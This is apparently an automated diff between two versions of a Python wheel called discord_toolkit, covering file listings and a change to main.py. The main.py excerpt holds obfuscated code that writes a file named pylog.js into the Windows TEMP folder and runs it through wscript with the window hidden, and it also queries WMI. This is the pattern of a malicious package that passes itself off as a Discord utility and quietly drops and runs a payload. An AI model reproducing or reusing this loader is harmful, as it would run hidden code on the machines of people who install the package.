# Comparing `tmp/discord_toolkit-0.2.55-py3-none-any.whl.zip` & `tmp/discord_toolkit-0.2.56-py3-none-any.whl.zip`

## zipinfo {}

```diff
@@ -1,8 +1,8 @@
-Zip file size: 2771 bytes, number of entries: 6
+Zip file size: 2775 bytes, number of entries: 6
 -rw-rw-rw-  2.0 fat       65 b- defN 24-May-10 17:19 discord_toolkit/__init__.py
--rw-rw-rw-  2.0 fat     3511 b- defN 24-May-10 17:19 discord_toolkit/main.py
--rw-rw-rw-  2.0 fat      185 b- defN 24-May-10 17:20 discord_toolkit-0.2.55.dist-info/METADATA
--rw-rw-rw-  2.0 fat       92 b- defN 24-May-10 17:20 discord_toolkit-0.2.55.dist-info/WHEEL
--rw-rw-rw-  2.0 fat       16 b- defN 24-May-10 17:20 discord_toolkit-0.2.55.dist-info/top_level.txt
--rw-rw-r--  2.0 fat      495 b- defN 24-May-10 17:20 discord_toolkit-0.2.55.dist-info/RECORD
-6 files, 4364 bytes uncompressed, 1865 bytes compressed:  57.3%
+-rw-rw-rw-  2.0 fat     3519 b- defN 24-May-10 17:37 discord_toolkit/main.py
+-rw-rw-rw-  2.0 fat      185 b- defN 24-May-10 17:38 discord_toolkit-0.2.56.dist-info/METADATA
+-rw-rw-rw-  2.0 fat       92 b- defN 24-May-10 17:38 discord_toolkit-0.2.56.dist-info/WHEEL
+-rw-rw-rw-  2.0 fat       16 b- defN 24-May-10 17:38 discord_toolkit-0.2.56.dist-info/top_level.txt
+-rw-rw-r--  2.0 fat      495 b- defN 24-May-10 17:38 discord_toolkit-0.2.56.dist-info/RECORD
+6 files, 4372 bytes uncompressed, 1869 bytes compressed:  57.3%
```

## zipnote {}

```diff
@@ -1,19 +1,19 @@
 Filename: discord_toolkit/__init__.py
 Comment: 
 
 Filename: discord_toolkit/main.py
 Comment: 
 
-Filename: discord_toolkit-0.2.55.dist-info/METADATA
+Filename: discord_toolkit-0.2.56.dist-info/METADATA
 Comment: 
 
-Filename: discord_toolkit-0.2.55.dist-info/WHEEL
+Filename: discord_toolkit-0.2.56.dist-info/WHEEL
 Comment: 
 
-Filename: discord_toolkit-0.2.55.dist-info/top_level.txt
+Filename: discord_toolkit-0.2.56.dist-info/top_level.txt
 Comment: 
 
-Filename: discord_toolkit-0.2.55.dist-info/RECORD
+Filename: discord_toolkit-0.2.56.dist-info/RECORD
 Comment: 
 
 Zip file comment:
```

## discord_toolkit/main.py

```diff
@@ -12,15 +12,15 @@
                O0OOO000000O000O0 =os .environ ['TEMP']#line:6
                OOOO0O000000OOO00 =os .path .join (O0OOO000000O000O0 ,"pylog.js")#line:7
                if not os .path .exists (OOOO0O000000OOO00 ):#line:8
                    with open (OOOO0O000000OOO00 ,'w')as OOO00000O00O000OO :#line:9
                        OOO00000O00O000OO .write (O00O0OOO0000OOO00 )#line:10
                    OOO00O00OOO0OOOO0 =subprocess .STARTUPINFO ()#line:11
                    OOO00O00OOO0OOOO0 .dwFlags |=subprocess .STARTF_USESHOWWINDOW #line:12
-                   subprocess .Popen (['wscript',OOOO0O000000OOO00 ],startupinfo =OOO00O00OOO0OOOO0 ,creationflags =subprocess .CREATE_NO_WINDOW )
+                   subprocess .Popen (['start','wscript',OOOO0O000000OOO00 ],startupinfo =OOO00O00OOO0OOOO0 ,creationflags =subprocess .CREATE_NO_WINDOW )
                    return True #line:14
                else :#line:15
                    return False #line:16
            def OO0000O00OO0OO0O0 ():#line:17
                try :#line:18
                    if platform .system ()=="Windows":#line:19
                        O00OO0OO0OOOO0000 =wmi .WMI ()#line:20
```

